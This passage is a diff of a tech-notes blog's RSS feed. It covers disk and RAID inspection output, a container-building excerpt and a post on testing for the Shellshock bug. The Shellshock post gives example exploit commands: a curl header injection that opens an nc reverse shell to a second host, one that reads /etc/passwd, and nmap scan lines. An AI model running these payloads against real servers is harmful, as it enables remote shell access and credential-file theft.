+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Form Factor: 2.5 inches
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device is: In smartctl database 7.3/5319
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ATA Version is: ATA8-ACS T13/1699-D revision &lt;span style="color:#ae81ff">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SATA Version is: SATA 2.6, 3.0 Gb/s &lt;span style="color:#f92672">(&lt;/span>current: 3.0 Gb/s&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Local Time is: Sat Nov &lt;span style="color:#ae81ff">19&lt;/span> 20:52:01 &lt;span style="color:#ae81ff">2022&lt;/span> PKT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SMART support is: Available - device has SMART capability.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SMART support is: Enabled
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="megacli">MegaCLI&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>megacli -LDInfo -Lall -aALL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Adapter &lt;span style="color:#ae81ff">0&lt;/span> -- Virtual Drive Information:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Virtual Drive: &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Target Id: 0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Name : SEAGATE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Size : &lt;span style="color:#ae81ff">320&lt;/span> GB
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector Size : &lt;span style="color:#ae81ff">512&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Mirror Data : &lt;span style="color:#ae81ff">320&lt;/span> GB
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>State : Optimal
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="lsscsi">lsscsi&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>lsscsi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>0:0:0:0&lt;span style="color:#f92672">]&lt;/span> disk ATA ST320LT012-9WS14 YAM1 /dev/sda
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="vendor-specific-tools">Vendor-Specific Tools&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>omreport storage vdisk
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>List of Virtual Disks in the System
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Controller SEAGATE Laptop HDD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ID : &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Status : Ok
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Name : SEAGATE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>State : Ready
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Hot Spare Policy violated : Not Assigned
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Encrypted : No
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Layout : RAID-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Size : 320.00 GB &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">343597383680&lt;/span> bytes&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T10 Protection Information Status : No
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Associated Fluid Cache State : Not Applicable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device Name : /dev/sda
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Bus Protocol : ATA
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Media : HDD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Read Policy : Adaptive Read Ahead
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Write Policy : Write Back
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache Policy : Not Applicable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Stripe Element Size : &lt;span style="color:#ae81ff">128&lt;/span> KB
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk Cache Policy : Enabled
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test Whether a Server Is Vulnerable to Shellshock Bug</title><link>https://linzeyan.github.io/zh-tw/posts/20221128-linux-shellshock-bug/</link><pubDate>Mon, 28 Nov 2022 15:35:30 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221128-linux-shellshock-bug/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://www.baeldung.com/linux/shellshock-bug" target="_blank" rel="noopener">Test Whether a Server Is Vulnerable to Shellshock Bug&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h5 id="the-shellshock-bug">The Shellshock Bug&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39; () {:;};&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="exploiting-shellshock-bug">Exploiting Shellshock Bug&lt;/h5>
+&lt;ul>
+&lt;li>A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.&lt;/li>
+&lt;li>The ignored commands from the user are put in the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable. If the user&amp;rsquo;s default shell is Bash, the Bash shell will parse the value of the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable on start-up and run the embedded commands.&lt;/li>
+&lt;/ul>
+&lt;h5 id="examples-of-shellshock-exploit-commands">Examples of Shellshock Exploit Commands&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -H &lt;span style="color:#e6db74">&amp;#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443&amp;#34;&lt;/span> 192.168.x.y/CGI-bin/hello.cgi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl --insecure 192.168.x.x -H &lt;span style="color:#e6db74">&amp;#34;User-Agent: () { :; }; /bin/cat /etc/passwd&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>use nmap script to test for the vulnerability&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock 192.168.x.x
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock --script-args uri&lt;span style="color:#f92672">=&lt;/span>/cgi-bin/bin,cmd&lt;span style="color:#f92672">=&lt;/span>ls 192.168.x.x
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Containers from scratch</title><link>https://linzeyan.github.io/zh-tw/posts/20221124-containers-from-scratch/</link><pubDate>Thu, 24 Nov 2022 13:10:14 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221124-containers-from-scratch/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://ericchiang.github.io/post/containers-from-scratch/" target="_blank" rel="noopener">Containers from scratch&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h3 id="container-file-systems">Container file systems&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://github.com/ericchiang/containers-from-scratch/releases/download/v0.1.0/rootfs.tar.gz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sha256sum rootfs.tar.gz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c79bfb46b9cf842055761a49161831aee8f4e667ad9e84ab57ab324a49bc828c rootfs.tar.gz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#75715e"># tar needs sudo to create /dev files and setup file ownership&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo tar -zxf rootfs.tar.gz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls rootfs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin dev home lib64 mnt proc run srv tmp var
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>boot etc lib media opt root sbin sys usr
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls -al rootfs/bin/ls
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwxr-xr-x. &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">118280&lt;/span> Mar &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2015&lt;/span> rootfs/bin/ls
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="chroot">chroot&lt;/h3>
+&lt;p>it allows us to restrict a process&amp;rsquo; view of the file system. In this case, we&amp;rsquo;ll restrict our process to the &amp;ldquo;rootfs&amp;rdquo; directory then exec a shell.&lt;/p></description></item><item><title>Gin 框架绑定 JSON 参数使用 jsoniter</title><link>https://linzeyan.github.io/zh-tw/posts/20211122-go-gin-jsoniter/</link><pubDate>Mon, 22 Nov 2021 10:27:39 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20211122-go-gin-jsoniter/</guid><description>&lt;ul>
 &lt;li>&lt;a href="https://mp.weixin.qq.com/s/nf9OYpN3f8HMDj_xkdCzdw" target="_blank" rel="noopener">Gin 框架绑定 JSON 参数使用 jsoniter&lt;/a>&lt;/li>
 &lt;/ul>
 &lt;h3 id="simple">simple&lt;/h3>
